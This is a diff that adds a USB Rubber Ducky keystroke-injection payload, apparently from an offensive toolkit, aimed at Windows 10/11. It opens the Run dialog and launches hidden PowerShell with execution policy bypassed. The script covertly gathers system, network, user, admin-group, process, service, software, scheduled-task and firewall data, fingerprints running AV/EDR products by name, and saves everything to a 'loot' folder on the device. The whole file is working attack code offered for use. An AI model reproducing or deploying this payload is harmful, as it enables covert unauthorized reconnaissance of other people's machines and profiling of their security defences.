@@ -1,0 +1,26 @@
+REM =============================================
+REM NullSec-SysEnum - System Enumerator
+REM Target: Windows 10/11
+REM Author: NullSec (bad-antics)
+REM =============================================
+REM
+REM Comprehensive Windows system enumeration:
+REM - System info (OS, architecture, domain)
+REM - Network configuration and adapters
+REM - User accounts and groups
+REM - Running processes and services
+REM - Installed software
+REM - Scheduled tasks
+REM - Firewall rules
+REM - AV/EDR detection
+REM
+REM Saves to Ducky USB storage for physical retrieval.
+REM No network exfil needed.
+REM =============================================
+
+DEFINE #LABEL DUCKY
+
+DELAY 500
+GUI r
+DELAY 800
+STRINGLN powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$d=(Get-Volume | Where-Object {$_.FileSystemLabel -eq '#LABEL'}).DriveLetter; if(-not $d){$d=(Get-Volume | Where-Object {$_.DriveType -eq 'Removable' -and $_.FileSystemLabel -ne ''} | Select-Object -First 1).DriveLetter}; $o=\"${d}:\loot\"; mkdir $o -Force | Out-Null; $h=$env:COMPUTERNAME; '=== SYSTEM INFO ===' | Out-File $o\$h-enum.txt; systeminfo | Out-File -Append $o\$h-enum.txt; '`n=== NETWORK CONFIG ===' | Out-File -Append $o\$h-enum.txt; ipconfig /all | Out-File -Append $o\$h-enum.txt; '`n=== ARP TABLE ===' | Out-File -Append $o\$h-enum.txt; arp -a | Out-File -Append $o\$h-enum.txt; '`n=== ROUTING TABLE ===' | Out-File -Append $o\$h-enum.txt; route print | Out-File -Append $o\$h-enum.txt; '`n=== USERS ===' | Out-File -Append $o\$h-enum.txt; net user | Out-File -Append $o\$h-enum.txt; '`n=== LOCAL ADMINS ===' | Out-File -Append $o\$h-enum.txt; net localgroup administrators | Out-File -Append $o\$h-enum.txt; '`n=== PROCESSES ===' | Out-File -Append $o\$h-enum.txt; Get-Process | Format-Table Name,Id,CPU,WorkingSet -AutoSize | Out-File -Append $o\$h-enum.txt; '`n=== SERVICES ===' | Out-File -Append $o\$h-enum.txt; Get-Service | Where-Object {$_.Status -eq 'Running'} | Format-Table Name,DisplayName,Status -AutoSize | Out-File -Append $o\$h-enum.txt; '`n=== INSTALLED SOFTWARE ===' | Out-File -Append $o\$h-enum.txt; Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName,DisplayVersion | Format-Table -AutoSize | Out-File -Append $o\$h-enum.txt; '`n=== SCHEDULED TASKS ===' | Out-File -Append $o\$h-enum.txt; schtasks /query /fo LIST /v 2>$null | Select-String 'TaskName|Status|Author' | Out-File -Append $o\$h-enum.txt; '`n=== FIREWALL ===' | Out-File -Append $o\$h-enum.txt; netsh advfirewall show allprofiles | Out-File -Append $o\$h-enum.txt; '`n=== AV/EDR ===' | Out-File -Append $o\$h-enum.txt; Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct 2>$null | Format-List displayName,productState | Out-File -Append $o\$h-enum.txt; Get-Process | Where-Object {$_.Name -match 'MsMp|defender|carbon|crowd|sentinel|cylance|symantec|mcafee|sophos|eset|kasper|norton|avg|avast|trend|panda|comodo|malware'} | Format-Table Name,Id | Out-File -Append $o\$h-enum.txt"
